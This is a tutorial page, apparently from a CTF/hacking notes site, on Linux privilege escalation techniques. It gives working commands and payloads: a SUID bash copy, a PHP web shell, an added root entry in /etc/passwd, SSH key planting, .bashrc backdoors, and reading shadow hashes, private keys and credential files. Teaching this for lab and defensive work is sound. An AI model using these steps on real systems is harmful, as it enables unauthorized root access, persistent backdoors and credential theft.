---
description: >-
  Go from a low-privilege user to a higher one to gain access to things you're
  not supposed to
---

# Linux Privilege Escalation

If a system has been set up well, you might not instantly get all the privileges on the machine when you get in. It's pretty common to have a web server run as a low-privilege user, so if it ever gets hacked the attacker might not be able to do much on the server.

The point of Privilege Escalation is to abuse features of the system to execute commands as more privileged users, thus escalating your own privileges on the system.​ Most of the information was from the Linux PrivEsc rooms on TryHackMe:

{% embed url="https://tryhackme.com/room/linprivesc" %}
First PrivEsc room with some basic techniques
{% endembed %}

{% embed url="https://tryhackme.com/room/linuxprivesc" %}
Second PrivEsc room with more advanced techniques and a lot of detail
{% endembed %}

## Getting Shells

Often in privilege escalation, you're letting a high-privilege user execute some command. Sometimes you can't directly execute a shell as that user and have to run some other command to send a way to get a shell somewhere. One simple way is to just execute a reverse shell as that user. Then you will get a privileged reverse shell in your listener. See [#reverse-shells](../hacking-linux-boxes.md#reverse-shells "mention") for some examples of this.&#x20;

Another easy way if you already have access to the box, is to create a [#setuid](command-triggers.md#setuid "mention") binary of bash that the target user is the owner of. The safest way to do this is to first copy /bin/bash to another location, which will make the owner of the file the user that executed the command. Then to later get back those privileges just add the SUID bit with `chmod +s` to take over the privileges of the owner when you execute the program as a low-privilege user.&#x20;

{% code title="Let target execute:" %}
```shell
cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
```
{% endcode %}

<pre class="language-shell-session" data-title="Low-privilege user"><code class="lang-shell-session"><strong>$ /tmp/bash -p  # -p to maintain privileges
</strong># id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
</code></pre>

### Writing files

If you can only write to files, without running commands yet, you can write to some specific locations that will later execute commands. Profile files such as `.bashrc` or `.profile` contain scripts that are executed every time the user logs in, and you may be able to hide a reverse shell command here to trigger whenever the user logs in again.&#x20;

If you are able to write at some place with code that is executed by another user, try overwriting this code with a reverse shell or anything else you want them to do. For example a PHP shell like `<?= system($_GET["cmd"]) ?>` to run commands on a website. This really depends on what technologies exist on the system, but overwriting libraries may also be an option.&#x20;

For an instant trigger, the root user may edit `/etc/passwd` to add another root-level user with your own password. Then you can log in as that user and get root privileges:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ openssl passwd 'hacker'  # Generate password
</strong>aQeFa8LxllpT.
</code></pre>

Then if you somehow append the following line to the `/etc/passwd` file, you will be able to log in as root using the password "hacker":

<pre class="language-shell"><code class="lang-shell">root:x:0:0:root:/root:/bin/bash
...
<strong>hacker:aQeFa8LxllpT.:0:0:root:/root:/bin/bash
</strong></code></pre>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ su hacker
</strong>Password: hacker
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

If the machine uses SSH, another way would be to append your own public key to the `.ssh/authorized_keys` file in the target's home directory, which permits you access to the user via SSH. Just `cat` out your own `~/.ssh/id_rsa.pub` starting with `ssh-rsa...` and add it to a new line in the `.ssh/authorized_keys` file. Then you are allowed to log in simply using SSH:

```shell-session
$ ssh root@$IP
```

{% hint style="warning" %}
Default installations of SSH don't allow logging in as `root`. To check this look at the `PermitRootLogin` option in `/etc/ssh/sshd_config`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ grep PermitRootLogin /etc/ssh/sshd_config
</strong>PermitRootLogin yes
</code></pre>
{% endhint %}

Another way is creating a **backdoor** in the user's home directory. For Bash, the `~/.bashrc` file is most common as it executes in any non-login interactive shell. However, for login shells like SSH, a few more are executed in the following order. The _first_ readable file is the _only_ one that executes:

1. `~/.bash_profile`
2. `~/.bash_login`
3. `~/.profile`

Often the above files execute `~/.bashrc` as well to make sure login shells work similarly to non-login ones, so this is often your best bet. Here is a table that shows what Bash by itself:

<table><thead><tr><th width="330.3333333333333">Command</th><th width="191">Execute ~/.bashrc?</th><th>Execute ~/.bash_profile?</th></tr></thead><tbody><tr><td><code>bash -c [command]</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>bash [command]</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>echo [command] | bash</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>[command]</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr><tr><td><code>ssh ... [command]</code></td><td><mark style="color:green;"><strong>YES</strong></mark></td><td><mark style="color:green;"><strong>YES</strong></mark></td></tr><tr><td><code>login</code>, <code>bash -l</code></td><td><mark style="color:red;"><strong>NO</strong></mark></td><td><mark style="color:green;"><strong>YES</strong></mark></td></tr><tr><td><code>bash</code></td><td><mark style="color:green;"><strong>YES</strong></mark></td><td><mark style="color:red;"><strong>NO</strong></mark></td></tr></tbody></table>

See [this article](https://www.baeldung.com/linux/bashrc-vs-bash-profile-vs-profile) to get a full understanding, as well as the [source code](https://github.com/bminor/bash/blob/ec8113b9861375e4e17b3307372569d429dec814/shell.c#L1123-L1260).&#x20;

### Reading files

Being able to read files as a privileged user can allow you to read sensitive information. If you are reading as the `root` user, you may read the shadow hashes in `/etc/shadow`, which can be cracked locally to find users' passwords (See more info in [#cracking-shadow-hashes](../../cryptography/hashing/cracking-hashes.md#cracking-shadow-hashes "mention")). Then if you have cracked a password you can just log in as that user using `su`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ su root
</strong>Password: password123
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

Another common file to read is SSH private keys. These are located in the user's home directory in a `.ssh` folder. To find the home directory for a user you can check `/etc/passwd`:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ cat /etc/passwd | awk -F: '{print $1, $6}'
</strong>root /root
...
www-data /var/www
user /home/user
</code></pre>

This folder often contains an `id_rsa` file that is only readable by the user, but contains the private key that can be used SSH into that user. When you are able to read this file, copy it to your attacking machine and use `ssh -i` to use the private key:

<pre class="language-shell-session" data-title="Attacker"><code class="lang-shell-session"><strong>$ cat id_rsa  # Downloaded private key
</strong>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAtc7FngGLGz9oReOq2b7k2grTgvQGtP+Yax3it73ZGuxASVKq
...
BAmcHcSorWfiOeasmS2HsoAqsBJr8DqDVAo4274CYxZooDqq+6Rimg==
-----END RSA PRIVATE KEY-----
<strong>$ chmod 600 id_rsa  # Set correct permissions to allow SSH to use it
</strong><strong>$ ssh -i id_rsa root@$IP
</strong># id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

Some places where you may find cleartext/hashed credentials are firstly `.htpasswd` files for websites, if authentication is implemented this way. These files will contain a username and password separated by a `:` colon. \
In [git.md](../../forensics/git.md "mention") repositories, the `.git/config` file may also hold credentials for a _remote origin_. These are in plaintext as they are used directly for authentication, so you may find strong passwords.

```bash
find / -type f -name .htpasswd 2>/dev/null
find / -type d -name .git 2>/dev/null
```

### Deleting files

This is a bit of a special case, but if you have a primitive to delete an arbitrary file, you may be able to remove files that protect a service normally but still work without the file. You may find that an application replaces a **configuration file** with the default if it cannot find it, resetting any extra protections an admin may have put on it.&#x20;

Another trick is when the target user does not want to be spied on, so they symlink their `~/.bash_history` to `/dev/null`. This is a common default configuration in some places as well. When you **delete** this file it will remove the symlink, and bash will simply create the file and write to it when the next command is executed that should be put in the history. You may be able to read sensitive command-line arguments like passwords or other secrets if it is readable by you.&#x20;
